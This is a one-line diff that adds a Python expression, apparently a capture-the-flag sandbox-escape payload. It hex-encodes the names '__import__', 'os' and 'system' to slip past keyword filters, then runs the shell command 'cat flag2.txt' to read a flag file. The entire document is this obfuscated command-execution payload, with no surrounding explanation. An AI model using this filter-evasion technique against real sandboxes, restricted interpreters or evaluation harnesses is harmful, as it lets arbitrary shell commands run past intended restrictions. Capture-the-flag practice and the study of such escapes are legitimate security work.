@@ -1,0 +1,1 @@
+__builtins__.__dict__[bytes.fromhex("5f5f696d706f72745f5f").decode('utf-8')](bytes.fromhex("6f73").decode('utf-8')).__dict__[bytes.fromhex("73797374656d").decode('utf-8')]('cat flag2.txt')
